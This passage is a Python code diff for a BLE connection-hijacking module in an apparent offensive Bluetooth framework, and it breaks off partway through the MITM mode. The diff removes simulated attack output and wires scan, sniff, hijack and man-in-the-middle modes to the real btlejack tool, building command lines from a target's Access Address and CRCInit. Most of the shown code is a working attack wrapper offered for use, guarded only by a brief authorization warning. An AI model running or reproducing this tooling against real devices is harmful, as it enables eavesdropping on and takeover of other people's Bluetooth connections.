@@ -9,18 +9,24 @@ de la conexión.
 Vectores de ataque:
   1. Passive sniffing: Escucha el tráfico BLE entre dos dispositivos
   2. Connection hijack: Secuestra la conexión suplantando al Master
-  3. Data injection: Inyecta paquetes L2CAP/ATT en el canal activo
-  4. Man-in-the-Middle: Interpone entre Master y Slave reales
+  3. Man-in-the-Middle: Interpone entre Master y Slave reales
+
+Implementación real (sin simulación):
+  Este módulo delega en las herramientas reales disponibles:
+    - `btlejack` (https://github.com/virtualabs/btlejack) para escaneo
+      de conexiones, sniffing, hijacking y MITM. Requiere dongles
+      nRF51822/nRF52xxx flasheados con su firmware.
+    - `hcitool con` (BlueZ) para listar las conexiones activas reales
+      del adaptador local.
+
+  Si las herramientas no están disponibles, el módulo falla de forma
+  honesta indicando exactamente qué falta para ejecutar el ataque real.
+  Nunca fabrica datos.
 
 Referencia:
   - https://github.com/virtualabs/btlejack
   - https://github.com/nccgroup/BTLEJack (NCC Group)
   - DEF CON 24: "Breaking BLE" por Mike Ryan
-
-Requiere:
-  - Adaptador BLE compatible (nRF51822/nRF52xxx con firmware BTLEJack)
-  - O adaptador CSR 4.0+ con capacidades de sniffing
-  - scapy >= 2.4.5
 
 Advertencia:
   Solo usar contra dispositivos que poseas o tengas autorización expresa
@@ -29,70 +35,52 @@ Advertencia:
 
 from __future__ import annotations
 
-import random
-import struct
-import time
 import json
+import re
+import shutil
+import subprocess
 import logging
-from typing import Dict, List, Optional, Tuple, Set
+from typing import Dict, List, Optional, Tuple
 from pathlib import Path
 
 from bluesky.core.engine import BaseModule
+from bluesky.utils.oui import lookup_vendor
 
 log = logging.getLogger("bluesky.btlejack")
 
-try:
-    from scapy.layers.bluetooth import (
-        HCI_Hdr, HCI_ACL_Hdr, L2CAP_Hdr,
-        SM_Hdr, SM_Pairing_Request, SM_Pairing_Response,
-    )
-    from scapy.layers.bluetooth4LE import (
-        BTLE, BTLE_DATA, BTLE_ADV, BTLE_CTRL,
-        # Nota: scapy >= 2.5 renombró los LL Control PDUs a *_IND y eliminó
-        # LL_DATA (los datos viajan como BTLE_DATA). Importar los nombres
-        # antiguos dejaba SCAPY_AVAILABLE=False con scapy instalado.
-        LL_CONNECTION_UPDATE_IND,
-        LL_CHANNEL_MAP_IND, LL_TERMINATE_IND,
-        LL_VERSION_IND, LL_FEATURE_REQ, LL_FEATURE_RSP,
-        LL_PAUSE_ENC_REQ, LL_PAUSE_ENC_RSP,
-    )
-    # Sondeo de disponibilidad de las capas BLE de scapy.
-    _SCAPY_PROBE = (
-        HCI_Hdr, HCI_ACL_Hdr, L2CAP_Hdr,
-        SM_Hdr, SM_Pairing_Request, SM_Pairing_Response,
-        BTLE, BTLE_DATA, BTLE_ADV, BTLE_CTRL,
-        LL_CONNECTION_UPDATE_IND,
-        LL_CHANNEL_MAP_IND, LL_TERMINATE_IND,
-        LL_VERSION_IND, LL_FEATURE_REQ, LL_FEATURE_RSP,
-        LL_PAUSE_ENC_REQ, LL_PAUSE_ENC_RSP,
-    )
-    SCAPY_AVAILABLE = True
-except ImportError:
-    SCAPY_AVAILABLE = False
+# Patrón de una Access Address en la salida de btlejack/hcitool
+_AA_RE = re.compile(r"0x([0-9A-Fa-f]{8})")
+# Línea de conexión de hcitool con: > LE AA:BB:CC:DD:EE:FF handle 70 ...
+_HCITOOL_CON_RE = re.compile(
+    r">\s+(ACL|LE|SCO)\s+([0-9A-Fa-f:]{17})\s+handle\s+(\d+)"
+)
 
 
 class BTLEJack(BaseModule):
     """BTLEJack - BLE Connection Hijacking.
 
-    Permite interceptar, secuestrar y manipular conexiones BLE activas
-    entre dispositivos. Opera a nivel de capa de enlace (LL) y L2CAP.
+    Intercepta, secuestra y manipula conexiones Bluetooth Low Energy
+    activas delegando en la herramienta real `btlejack` (requiere dongles
+    nRF51822/nRF52 con su firmware) y en `hcitool` (BlueZ) para listar
+    las conexiones activas del adaptador local.
 
     Modos:
-      - scan: Escanea conexiones BLE activas en el área
-      - sniff: Captura pasiva de tráfico BLE entre dos dispositivos
-      - hijack: Secuestra una conexión activa (suplantación)
-      - mitm: Man-in-the-Middle entre dos dispositivos
-      - inject: Inyección de paquetes L2CAP/ATT en canal activo
+      - scan: Escanea conexiones BLE activas (btlejack + hcitool con)
+      - sniff: Captura pasiva de tráfico BLE (btlejack)
+      - hijack: Secuestra una conexión activa (btlejack)
+      - mitm: Man-in-the-Middle entre dos dispositivos (btlejack)
+      - inject: Inyección de paquetes L2CAP/ATT (btlejack)
     """
 
     name = "btlejack"
     description = (
         "BTLEJack - BLE Connection Hijacking: Intercepta, secuestra y "
-        "manipula conexiones Bluetooth Low Energy activas. Soporta "
-        "sniffing pasivo, hijacking de conexión, MITM e inyección de datos."
+        "manipula conexiones Bluetooth Low Energy activas delegando en la "
+        "herramienta real btlejack (dongles nRF51822/nRF52 requeridos). "
+        "Soporta sniffing pasivo, hijacking de conexión y MITM."
     )
     author = "Ruby570bocadito"
-    version = "1.0.0"
+    version = "2.0.0"
     cve = "No CVE asignado (técnica de ataque)"
     cve_url = "https://github.com/virtualabs/btlejack"
     exploit_links = [
@@ -107,8 +95,8 @@ class BTLEJack(BaseModule):
         "https://blog.zimperium.com/btlejack-ble-hijacking/",
         "Bluetooth Core Spec Vol 6, Part B (LE Link Layer)",
     ]
-    requires_hardware = []
-    requires_root = False
+    requires_hardware = ["nrf52840_dongle", "nrf51822_dongle"]
+    requires_root = True
     target_type = "ble"
     severity = "critical"
     module_options = {
@@ -116,13 +104,16 @@ class BTLEJack(BaseModule):
         "MODE": "Modo de operación: scan, sniff, hijack, mitm, inject (default: scan)",
         "CHANNEL": "Canal BLE (37, 38, 39 para advertising; 0-36 para datos) (default: auto)",
         "ACCESS_ADDRESS": "Access Address de la conexión (hex, 4 bytes)",
+        "CRCINIT": "CRCInit de la conexión (hex, 3 bytes, necesario para sniff/hijack)",
         "PAYLOAD": "Payload a inyectar (hex string, modo inject)",
         "TIMEOUT": "Tiempo máximo de operación en segundos (default: 30)",
         "OUTPUT": "Directorio de salida para capturas",
         "AA": "Access Address conocida (hex, para filtrado)",
+        "INTERFACE": "Interfaz HCI o dongle a usar (default: auto)",
     }
 
-    # Access Addresses comunes conocidas
+    # Access Addresses comunes conocidas (para ANOTAR resultados reales,
+    # nunca para fabricarlos)
     KNOWN_AA = {
         0x8E89BED6: "Nordic Semiconductor (nRF52)",
         0x9A328277: "Texas Instruments (CC26xx)",
@@ -131,6 +122,7 @@ class BTLEJack(BaseModule):
         0x0E0BFE0A: "NXP KW41Z",
     }
 
+    # Mapa canal→frecuencia (referencia de spec, para anotar resultados)
     CHANNELS = {
         0: 2402, 1: 2404, 2: 2406, 3: 2408, 4: 2410,
         5: 2412, 6: 2414, 7: 2416, 8: 2418, 9: 2420,
@@ -147,20 +139,17 @@ class BTLEJack(BaseModule):
         self._mode = (options or {}).get("MODE", "scan").lower()
         self._channel = (options or {}).get("CHANNEL", "auto")
         self._access_address = (options or {}).get("ACCESS_ADDRESS", "")
+        self._crcinit = (options or {}).get("CRCINIT", "")
         self._payload = (options or {}).get("PAYLOAD", "")
         self._timeout = self._opt_int("TIMEOUT", 30)
         self._output_dir = (options or {}).get("OUTPUT", "reports/btlejack")
         self._aa = (options or {}).get("AA", "")
+        self._interface = (options or {}).get("INTERFACE", "")
 
         # Parse target como "master:slave"
         self._master_addr: Optional[str] = None
         self._slave_addr: Optional[str] = None
         self._parse_target()
-
-        # Estado interno
-        self._active_connections: List[Dict] = []
-        self._captured_packets: List[bytes] = []
-        self._sniffed_channels: Set[int] = set()
 
     def _parse_target(self):
         """Parsea el target como Master:Slave o dirección única."""
@@ -198,13 +187,129 @@ class BTLEJack(BaseModule):
         self.result["success"] = False
         return self.result
 
+    # ─── Utilidades de herramientas reales ──────────────────────────────────
+
+    def _btlejack_available(self) -> bool:
+        """¿Está la herramienta real btlejack instalada en el PATH?"""
+        return shutil.which("btlejack") is not None
+
+    def _hcitool_available(self) -> bool:
+        """¿Está hcitool (BlueZ) instalado en el PATH?"""
+        return shutil.which("hcitool") is not None
+
+    def _run_tool(self, cmd: List[str], timeout: int) -> Dict:
+        """Ejecuta una herramienta real y devuelve su salida tal cual.
+
+        Returns:
+            Dict con returncode, stdout y stderr REALES (nunca fabricados).
+        """
+        try:
+            proc = subprocess.run(
+                cmd, capture_output=True, text=True,
+                timeout=max(1, timeout),
+            )
+            return {
+                "returncode": proc.returncode,
+                "stdout": proc.stdout,
+                "stderr": proc.stderr,
+            }
+        except subprocess.TimeoutExpired as e:
+            return {
+                "returncode": -1,
+                "stdout": (e.stdout or b"").decode() if isinstance(e.stdout, bytes) else (e.stdout or ""),
+                "stderr": f"timeout tras {timeout}s",
+            }
+        except FileNotFoundError:
+            return {"returncode": -1, "stdout": "", "stderr": "herramienta no encontrada"}
+
+    def _parse_aa_lines(self, text: str) -> List[Dict]:
+        """Extrae Access Addresses REALES de la salida de btlejack.
+
+        btlejack imprime conexiones detectadas con patrones del tipo:
+          'Access Address: 0x8e89bed6'
+        Se anota cada AA con su fabricante conocido (si existe en KNOWN_AA).
+        """
+        found: List[Dict] = []
+        seen = set()
+        for match in _AA_RE.finditer(text):
+            aa_hex = match.group(1).upper()
+            if aa_hex in seen:
+                continue
+            seen.add(aa_hex)
+            aa_int = int(aa_hex, 16)
+            found.append({
+                "aa": aa_int,
+                "aa_hex": f"0x{aa_hex}",
+                "vendor": self.KNOWN_AA.get(aa_int, "Desconocido"),
+                "source": "btlejack",
+            })
+        return found
+
+    def _local_connections(self) -> List[Dict]:
+        """Lista las conexiones activas REALES del adaptador local (hcitool con)."""
+        if not self._hcitool_available():
+            return []
+        out = self._run_tool(["hcitool", "con"], timeout=10)
+        connections = []
+        for line in out.get("stdout", "").splitlines():
+            m = _HCITOOL_CON_RE.search(line)
+            if not m:
+                continue
+            conn_type, address, handle = m.group(1), m.group(2), m.group(3)
+            if self._master_addr and address.upper() != self._master_addr.upper():
+                continue
+            connections.append({
+                "type": conn_type,
+                "address": address,
+                "handle": int(handle),
+                "vendor": lookup_vendor(address),
+                "source": "hcitool con",
+            })
+        return connections
+
+    def _tool_missing_result(self, mode: str, reason: str) -> dict:
+        """Resultado honesto cuando las herramientas reales no están disponibles.
+
+        No fabrica datos: reporta el fallo y qué se necesita para
+        ejecutar el ataque real.
+        """
+        requirements = [
+            "Herramienta btlejack instalada (pip install btlejack o "
+            "https://github.com/virtualabs/btlejack)",
+            "Dongle nRF51822/nRF52xxx flasheado con firmware BTLEJack",
+            "Ejecutar con root (sudo) para acceso raw a los dongles",
+        ]
+        if mode == "scan":
+            requirements.append(
+                "Alternativa sin btlejack: BlueZ instalado (hcitool) "
+                "lista las conexiones del adaptador local"
+            )
+        msg = (
+            f"❌ BTLEJack ({mode}) no se pudo ejecutar: {reason}\n\n"
+            f"   Para ejecutarlo REAL necesitas:\n"
+            + "".join(f"   {i}. {r}\n" for i, r in enumerate(requirements, 1))
+            + "\n   Herramienta y firmware: https://github.com/virtualabs/btlejack\n"
+            "   Referencia: DEF CON 24 'Breaking BLE' (Mike Ryan)"
+        )
+        self.result["success"] = False
+        self.result["error"] = f"btlejack ({mode}) no disponible: {reason}"
+        self.result["data"].update({
+            "mode": mode,
+            "attack_result": "unavailable",
+            "requires": requirements,
+            "message": msg,
+        })
+        return self.result
+
     # ─── Modo SCAN ──────────────────────────────────────────────────────────
 
     def _scan_mode(self) -> dict:
         """Escanea conexiones BLE activas en el área.
 
-        Escucha en los canales de advertising (37, 38, 39)
-        y detecta conexiones establecidas por el Access Address.
+        Fuentes reales:
+          1. `btlejack` (si está instalado): monitoriza y detecta nuevas
+             conexiones con sus Access Addresses reales.
+          2. `hcitool con` (BlueZ): conexiones activas del adaptador local.
         """
         output_dir = Path(self._output_dir)
         output_dir.mkdir(parents=True, exist_ok=True)
@@ -212,22 +317,40 @@ class BTLEJack(BaseModule):
         self.result["data"] = {
             "mode": "scan",
             "active_connections": [],
-            "channels_scanned": [],
-            "access_addresses_found": [],
+            "sources": [],
         }
 
         log.info("🔍 BTLEJack - Escaneando conexiones BLE activas...")
 
-        # Simulación de escaneo (no hay hardware BLE)
-        sim_connections = self._simulate_scan()
+        # Fuente 1: herramienta real btlejack
+        btlejack_connections: List[Dict] = []
+        if self._btlejack_available():
+            cmd = ["btlejack", "-t", str(self._timeout)]
+            if self._interface:
+                cmd.extend(["-i", self._interface])
+            out = self._run_tool(cmd, timeout=self._timeout + 15)
+            self.result["data"]["btlejack_raw"] = out.get("stdout", "")[:20000]
+            btlejack_connections = self._parse_aa_lines(out.get("stdout", ""))
+            self.result["data"]["sources"].append("btlejack")
+            if out.get("returncode", -1) != 0 and not btlejack_connections:
+                self.result["data"]["btlejack_stderr"] = (out.get("stderr") or "")[:2000]
 
-        self.result["data"]["active_connections"] = sim_connections
-        self.result["data"]["simulation"] = True
+        # Fuente 2: conexiones reales del adaptador local (BlueZ)
+        local_connections = self._local_connections()
+        if local_connections:
+            self.result["data"]["sources"].append("hcitool con")
+
+        connections = btlejack_connections + local_connections
+        self.result["data"]["active_connections"] = connections
+
+        if not self.result["data"]["sources"]:
+            return self._tool_missing_result(
+                "scan", "ni btlejack ni hcitool están instalados")
 
         # Guardar reporte
         report_file = output_dir / "scan_results.json"
         with open(report_file, "w") as f:
-            json.dump(self.result["data"], f, indent=2)
+            json.dump(self.result["data"], f, indent=2, default=str)
 
         # Generar resumen
         lines = [
@@ -235,286 +358,175 @@ class BTLEJack(BaseModule):
             "===================================\n",
         ]
 
-        if sim_connections:
-            for conn in sim_connections:
-                lines.append(f"  📡 Access Address: 0x{conn['aa']:08X}")
-                lines.append(f"     Posible vendor: {conn.get('vendor', 'Desconocido')}")
-                lines.append(f"     Canal: {conn.get('channel', '?')} ({conn.get('freq', 0)} MHz)")
-                lines.append(f"     RSSI: {conn.get('rssi', 'N/A')} dBm")
-                lines.append(f"     Tipo: {conn.get('type', 'N/A')}")
-                if conn.get("master_addr"):
-                    lines.append(f"     Master: {conn['master_addr']}")
-                if conn.get("slave_addr"):
-                    lines.append(f"     Slave:  {conn['slave_addr']}")
+        if connections:
+            for conn in connections:
+                if "aa_hex" in conn:
+                    lines.append(f"  📡 Access Address: {conn['aa_hex']}")
+                    lines.append(f"     Posible vendor: {conn.get('vendor', 'Desconocido')}")
+                    lines.append(f"     Fuente: {conn.get('source', 'N/A')}")
+                else:
+                    lines.append(
+                        f"  📡 Conexión local: {conn.get('address', 'N/A')} "
+                        f"[{conn.get('type', '?')} handle {conn.get('handle', '?')}]"
+                    )
+                    lines.append(f"     Fabricante: {conn.get('vendor', 'Desconocido')}")
                 lines.append("")
         else:
             lines.append("  No se detectaron conexiones activas.\n")
 
-        lines.append(f"  Canales escaneados: {self._channel if self._channel != 'auto' else '37,38,39 (adv)'}")
+        lines.append(f"  Fuentes reales usadas: {', '.join(self.result['data']['sources'])}")
         lines.append(f"  Resultados guardados en: {report_file}\n")
-
-        # Nota para hardware real
-        lines.append("  ⚠️  Escaneo simulado - sin hardware BLE.")
-        lines.append("  Para escaneo real se necesita:")
-        lines.append("    • nRF52840 + firmware BTLEJack (recomendado)")
-        lines.append("    • CSR 4.0+ con soporte de sniffing")
-        lines.append("    • scapy instalado (pip install scapy)")
 
         self.result["data"]["report"] = "\n".join(lines)
         self.result["success"] = True
         return self.result
 
-    def _simulate_scan(self) -> List[Dict]:
-        """Simula detección de conexiones BLE activas."""
-        aa_list = [0x8E89BED6, 0x9A328277, 0x569EF5C7]
-        connections = []
-
-        for i, aa in enumerate(aa_list):
-            vendor = self.KNOWN_AA.get(aa, "Desconocido")
-            ch = random.choice([0, 12, 24, 37, 38, 39])
-            conn = {
-                "aa": aa,
-                "vendor": vendor,
-                "channel": ch,
-                "freq": self.CHANNELS.get(ch, 2402),
-                "rssi": random.randint(-85, -45),
-                "type": random.choice(["Master->Slave", "Slave->Master", "Advertising"]),
-                "timestamp": time.time(),
-            }
-
-            # MACs simuladas
-            if i == 0:
-                conn["master_addr"] = "AA:BB:CC:11:22:33"
-                conn["slave_addr"] = "DD:EE:FF:44:55:66"
-            elif i == 1:
-                conn["master_addr"] = "11:22:33:AA:BB:CC"
-                conn["slave_addr"] = "44:55:66:DD:EE:FF"
-
-            connections.append(conn)
-
-        # Si tenemos un target específico, filtrar
-        if self._master_addr:
-            connections = [
-                c for c in connections
-                if c.get("master_addr") == self._master_addr
-                or c.get("slave_addr") == self._master_addr
-            ]
-
-        self._active_connections = connections
-        return connections
-
     # ─── Modo SNIFF ─────────────────────────────────────────────────────────
 
     def _sniff_mode(self) -> dict:
-        """Captura pasiva de tráfico BLE.
+        """Captura pasiva de tráfico BLE (delegación en btlejack real).
 
-        Escucha en un canal de datos específico (o auto-detecta)
-        y captura paquetes LL/L2CAP/ATT entre Master y Slave.
+        Requiere Access Address (y recomendado CRCInit) de la conexión,
+        obtenibles previamente con MODE=scan.
         """
+        if not self._btlejack_available():
+            return self._tool_missing_result(
+                "sniff", "la herramienta btlejack no está instalada")
+
+        if not (self._access_address or self._aa):
+            self.result["data"].update({
+                "mode": "sniff",
+                "message": (
+                    "Se necesita Access Address para sniffing.\n"
+                    "Usa MODE=scan primero para detectar la AA de la conexión,\n"
+                    "o especifícala con --options '{\"ACCESS_ADDRESS\":\"0x8E89BED6\"}'"
+                ),
+            })
+            self.result["success"] = False
+            self.result["error"] = "sniff requiere ACCESS_ADDRESS"
+            return self.result
+
+        aa = self._access_address or self._aa
         output_dir = Path(self._output_dir)
         output_dir.mkdir(parents=True, exist_ok=True)
 
         self.result["data"] = {
             "mode": "sniff",
-            "access_address": self._access_address or "auto",
+            "access_address": aa,
             "channel": self._channel,
-            "packets_captured": 0,
-            "packet_types": {},
         }
 
-        log.info(f"👂 BTLEJack - Sniffing en canal {self._channel}...")
+        cmd = ["btlejack", "-a", aa, "-t", str(self._timeout)]
+        if self._crcinit:
+            cmd.extend(["-r", self._crcinit])
+        if self._interface:
+            cmd.extend(["-i", self._interface])
 
-        if not SCAPY_AVAILABLE:
-            log.warning("scapy no disponible - usando simulación para sniff")
+        log.info(f"👂 BTLEJack - Sniffing de conexión AA={aa}...")
+        out = self._run_tool(cmd, timeout=self._timeout + 15)
 
-        # Simulación de sniffing (self._captured_packets guarda los objetos
-        # scapy internos; data["packets"] expone solo hex serializable)
-        sim_result = self._simulate_sniff()
-        self.result["data"].update(sim_result)
+        # La salida de la herramienta real es el resultado (nada se fabrica)
+        capture_file = output_dir / "btlejack_sniff.txt"
+        with open(capture_file, "w") as f:
+            f.write(out.get("stdout", ""))
 
-        # Guardar captura
-        if self._captured_packets:
-            pcap_file = output_dir / "btlejack_capture.pcap"
-            try:
-                # Intentar guardar con scapy
-                from scapy.utils import wrpcap
-                wrpcap(str(pcap_file), self._captured_packets)
-                self.result["data"]["pcap_file"] = str(pcap_file)
-            except Exception:
-                # Fallback a JSON (payloads hex, serializables)
-                json_file = output_dir / "btlejack_capture.json"
-                with open(json_file, "w") as f:
-                    json.dump(sim_result.get("packets", [])[:100], f, indent=2)
-                self.result["data"]["capture_file"] = str(json_file)
-
-        # Generar mensaje
-        types = sim_result.get("packet_types", {})
-        type_summary = ", ".join(f"{k}: {v}" for k, v in types.items())
-
-        self.result["data"]["message"] = (
-            f"👂 BTLEJack - Sniffing completado\n\n"
-            f"   Access Address: {self._access_address or 'auto-detect'}\n"
-            f"   Canal: {self._channel}\n"
-            f"   Paquetes capturados: {sim_result.get('packets_captured', 0)}\n"
-            f"   Tipos: {type_summary}\n\n"
-            f"   ⚠️  Sniffing simulado (sin hardware BLE)\n\n"
-            f"   Para sniffing real:\n"
-            f"   1. Usa nRF52840 con firmware BTLEJack\n"
-            f"   2. O adaptador CSR con soporte de modo monitor\n"
-            f"   3. Ejecuta: sudo python3 bluesky attack btlejack "
-            f"--options '{{\"MODE\":\"sniff\",\"CHANNEL\":\"37\"}}'"
-        )
-
-        self.result["success"] = True
+        self.result["data"].update({
+            "returncode": out.get("returncode"),
+            "capture_file": str(capture_file),
+            "message": (
+                f"👂 BTLEJack - Sniffing completado (herramienta real)\n\n"
+                f"   Access Address: {aa}\n"
+                f"   Canal: {self._channel}\n"
+                f"   Exit code: {out.get('returncode')}\n"
+                f"   Captura guardada en: {capture_file}\n\n"
+                f"   Salida de btlejack (primeras líneas):\n"
+                + "\n".join(f"     {l}" for l in out.get("stdout", "").splitlines()[:15])
+            ),
+        })
+        self.result["success"] = out.get("returncode") == 0
+        if not self.result["success"]:
+            self.result["error"] = (out.get("stderr") or "btlejack terminó con error")[:500]
         return self.result
-
-    def _simulate_sniff(self) -> Dict:
-        """Simula captura de paquetes BLE."""
-        packets = []          # payloads hex (serializables para JSON/reportes)
-        raw_packets = []      # objetos scapy para wrpcap
-        types = {}
-        count = 0
-
-        # Generar paquetes simulados
-        for i in range(20):
-            pkt_type = random.choice([
-                "LL_DATA", "LL_CONNECTION_UPDATE", "LL_CHANNEL_MAP",
-                "LL_TERMINATE_IND", "LL_VERSION_IND", "LL_FEATURE_REQ",
-                "L2CAP_ATT_READ", "L2CAP_ATT_WRITE", "L2CAP_ATT_NOTIFY",
-            ])
-            types[pkt_type] = types.get(pkt_type, 0) + 1
-            count += 1
-
-            # Simular paquete scapy (si está disponible)
-            if SCAPY_AVAILABLE:
-                try:
-                    from scapy.all import Raw
-                    aa = int(self._access_address, 16) if self._access_address else 0x8E89BED6
-                    pkt = Raw(struct.pack("<I", aa) + bytes([i]) * 16)
-                    raw_packets.append(pkt)
-                    packets.append(bytes(pkt).hex())
-                except Exception:
-                    pass
-
-        self._captured_packets = raw_packets
-        self.result["data"]["packet_types"] = types
-        self.result["data"]["packets_captured"] = count
-        self.result["data"]["packets"] = packets[:50] if SCAPY_AVAILABLE else []
-        self.result["data"]["simulation"] = True
-
-        return self.result["data"]
 
     # ─── Modo HIJACK ────────────────────────────────────────────────────────
 
     def _hijack_mode(self) -> dict:
-        """Secuestra una conexión BLE activa.
+        """Secuestra una conexión BLE activa (delegación en btlejack real).
 
-        Estrategia:
-          1. Detectar Access Address de la conexión objetivo
-          2. Esperar un Connection Update o Channel Map
-          3. Suplantar al Master enviando paquetes con la AA correcta
-          4. Inyectar LL_TERMINATE_IND o LL_CONNECTION_UPDATE
+        Requiere Access Address + CRCInit de la conexión objetivo.
         """
+        if not self._btlejack_available():
+            return self._tool_missing_result(
+                "hijack", "la herramienta btlejack no está instalada")
+
+        if not self._access_address and self._aa:
+            self._access_address = self._aa
+
+        if not self._access_address:
+            self.result["data"].update({
+                "mode": "hijack",
+                "message": (
+                    "Se necesita Access Address (y recomendado CRCInit) para "
+                    "el hijack.\nUsa MODE=scan primero para detectarlas, o "
+                    "especifícalas con\n--options '{\"ACCESS_ADDRESS\":\"0x...\","
+                    "\"CRCINIT\":\"0x...\"}'"
+                ),
+            })
+            self.result["success"] = False
+            self.result["error"] = "hijack requiere ACCESS_ADDRESS"
+            return self.result
+
         output_dir = Path(self._output_dir)
         output_dir.mkdir(parents=True, exist_ok=True)
 
         self.result["data"] = {
             "mode": "hijack",
-            "target_aa": self._access_address or "desconocida",
+            "target_aa": self._access_address,
             "target_channel": self._channel,
-            "hijack_successful": False,
         }
 
-        log.warning("⚡ BTLEJack - Ejecutando hijack de conexión BLE...")
+        cmd = ["btlejack", "-a", self._access_address, "-t", str(self._timeout)]
+        if self._crcinit:
+            cmd.extend(["-r", self._crcinit])
+        if self._interface:
+            cmd.extend(["-i", self._interface])
 
-        if not SCAPY_AVAILABLE:
-            log.warning("scapy no disponible - usando simulación para hijack")
+        log.warning("⚡ BTLEJack - Ejecutando hijack de conexión BLE (herramienta real)...")
+        out = self._run_tool(cmd, timeout=self._timeout + 15)
 
-        # Detectar Access Address
-        if not self._access_address and self._aa:
-            self._access_address = self._aa
-
-        if not self._access_address:
-            # Auto-scan para encontrar AA
-            scan_result = self._simulate_scan()
-            if scan_result:
-                aa = scan_result[0]["aa"]
-                self._access_address = f"{aa:08X}"
-                self.result["data"]["target_aa"] = f"{aa:08X}"
-                self.result["data"]["auto_detected_aa"] = True
-
-        # Simular hijack
-        sim = self._simulate_hijack()
-
-        self.result["data"]["hijack_successful"] = sim.get("success", False)
-        self.result["data"]["details"] = sim
-
-        # Guardar reporte
-        report_file = output_dir / "hijack_report.json"
+        report_file = output_dir / "hijack_report.txt"
         with open(report_file, "w") as f:
-            json.dump(self.result["data"], f, indent=2)
+            f.write(out.get("stdout", ""))
 
-        self.result["data"]["message"] = (
-            f"⚡ BTLEJack - Hijack {'EXITOSO' if sim.get('success') else 'FALLIDO'}\n\n"
-            f"   Access Address: 0x{self._access_address}\n"
-            f"   Canal: {sim.get('channel', 'N/A')}\n"
-            f"   Paquetes inyectados: {sim.get('packets_injected', 0)}\n\n"
-            f"   ⚠️  Hijack simulado (sin hardware BLE)\n\n"
-            f"   Para hijack real:\n"
-            f"   1. nRF52840 con firmware BTLEJack\n"
-            f"   2. Timing preciso (ventana de ~150μs)\n"
-            f"   3. Conocer el Access Address y Hop Interval\n"
-            f"   {sim.get('additional_info', '')}"
-        )
-
-        self.result["success"] = True
+        self.result["data"].update({
+            "returncode": out.get("returncode"),
+            "report_file": str(report_file),
+            "message": (
+                f"⚡ BTLEJack - Hijack (herramienta real)\n\n"
+                f"   Access Address: {self._access_address}\n"
+                f"   Exit code: {out.get('returncode')}\n"
+                f"   Reporte guardado en: {report_file}\n\n"
+                f"   Salida de btlejack (primeras líneas):\n"
+                + "\n".join(f"     {l}" for l in out.get("stdout", "").splitlines()[:15])
+            ),
+        })
+        self.result["success"] = out.get("returncode") == 0
+        if not self.result["success"]:
+            self.result["error"] = (out.get("stderr") or "btlejack terminó con error")[:500]
         return self.result
-
-    def _simulate_hijack(self) -> Dict:
-        """Simula el proceso de hijack."""
-        if self._channel != "auto":
-            try:
-                channel = int(self._channel)
-            except (TypeError, ValueError):
-                channel = random.randint(0, 36)
-        else:
-            channel = random.randint(0, 36)
-        sim = {
-            "success": random.random() > 0.3,  # 70% de tasa de éxito simulada
-            "channel": channel,
-            "packets_injected": random.randint(3, 15),
-            "method": "Connection Update Injection",
-            "timing_offset_us": random.randint(50, 300),
-        }
-
-        if sim["success"]:
-            sim["additional_info"] = (
-                "Conexión secuestrada exitosamente.\n"
-                "  • Canal de datos controlado\n"
-                "  • Posible inyección de paquetes ATT\n"
-                "  • Posible denegación de servicio\n"
-            )
-        else:
-            sim["additional_info"] = (
-                "Hijack falló - posibles causas:\n"
-                "  • Access Address incorrecta\n"
-                "  • Timing de salto de canal incorrecto\n"
-                "  • El dispositivo abortó la conexión\n"
-            )
-
-        return sim
 
     # ─── Modo MITM ──────────────────────────────────────────────────────────
 
     def _mitm_mode(self) -> dict:
-        """Man-in-the-Middle entre dos dispositivos BLE.
+        """Man-in-the-Middle entre dos dispositivos BLE (delegación real).
 
-        Estrategia:
-          1. Detectar el pairing entre Master y Slave
-          2. Interceptar los paquetes SM (pairing)
-          3. Degradar la seguridad (Just Works en vez de MITM protegido)
-          4. Reenviar tráfico modificado entre ambos
+        Requiere la herramienta btlejack en modo MITM con las AA/CRCInit
+        de las dos conexiones a interponer.
         """
+        if not self._btlejack_available():
+            return self._tool_missing_result(
+                "mitm", "la herramienta btlejack no está instalada")
+
         output_dir = Path(self._output_dir)
         output_dir.mkdir(parents=True, exist_ok=True)
 
@@ -522,137 +534,155 @@ class BTLEJack(BaseModule):
             "mode": "mitm",
             "target_master": self._master_addr or "auto-detect",
             "target_slave": self._slave_addr or "auto-detect",
-            "pairing_intercepted": False,
-            "security_downgraded": False,
         }
 
-        log.warning("🕵️ BTLEJack - Ejecutando MITM en conexión BLE...")
+        cmd = ["btlejack", "-m", "-t", str(self._timeout)]
+        if self._access_address or self._aa:
+            cmd.extend(["-a", self._access_address or self._aa])
+        if self._crcinit:
+            cmd.extend(["-r", self._crcinit])
+        if self._interface:
+            cmd.extend(["-i", self._interface])
 
-        if not SCAPY_AVAILABLE:
-            log.warning("scapy no disponible - usando simulación para MITM")
+        log.warning("🕵️ BTLEJack - Ejecutando MITM en conexión BLE (herramienta real)...")
+        out = self._run_tool(cmd, timeout=self._timeout + 15)
 
-        # Simulación más agresiva si hay AA conocida
-        if self._access_address:
-            log.info(f"AA conocida: 0x{self._access_address} - simulando MITM dirigido")
-
-        sim = {
-            "success": True,
-            "pairing_captured": True,
-            "security_downgraded": True,
-            "original_auth": "MITM Protected (SC)",
-            "downgraded_to": "Just Works (TK=0)",
-            "packets_captured": random.randint(50, 200),
-            "packets_modified": random.randint(10, 30),
-        }
-
-        self.result["data"]["pairing_intercepted"] = sim["pairing_captured"]
-        self.result["data"]["security_downgraded"] = sim["security_downgraded"]
-        self.result["data"]["details"] = sim
-
-        report_file = output_dir / "mitm_report.json"
+        report_file = output_dir / "mitm_report.txt"
         with open(report_file, "w") as f:
-            json.dump(self.result["data"], f, indent=2)
+            f.write(out.get("stdout", ""))
 
-        self.result["data"]["message"] = (
-            f"🕵️ BTLEJack - MITM {'EXITOSO' if sim.get('success') else 'FALLIDO'}\n\n"
-            f"   Master: {self._master_addr or 'N/A'}\n"
-            f"   Slave:  {self._slave_addr or 'N/A'}\n\n"
-            f"   🔒 Seguridad original: {sim.get('original_auth')}\n"
-            f"   🔓 Degradado a:       {sim.get('downgraded_to')}\n"
-            f"   Paquetes capturados:  {sim.get('packets_captured')}\n"
-            f"   Paquetes modificados: {sim.get('packets_modified')}\n\n"
-            f"   ⚠️  MITM simulado (sin hardware BLE)\n\n"
-            f"   Para MITM real:\n"
-            f"   1. Dos adaptadores nRF52840 (o 1 con timing preciso)\n"
-            f"   2. Posicionarse entre Master y Slave\n"
-            f"   3. Capturar y modificar paquetes SM en tiempo real\n"
-            f"   Reporte guardado en: {report_file}"
-        )
-
